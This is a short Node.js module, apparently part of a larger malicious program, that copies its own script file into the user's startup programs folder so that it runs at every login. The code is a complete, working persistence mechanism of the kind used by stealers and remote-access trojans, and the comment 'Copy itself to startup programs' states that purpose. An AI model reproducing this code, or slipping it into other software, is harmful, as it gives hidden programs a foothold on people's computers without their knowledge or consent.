const { paths: { startupPrograms } } = require('../variables');
const { copyFile } = require('fs');
const { resolve, sep } = require('path');

const file = process.argv[1];
const fileName = file.split(sep).pop();

// Copy itself to startup programs
copyFile(file, resolve(startupPrograms, fileName), (err) => {
  if (err) console.error(err);
});
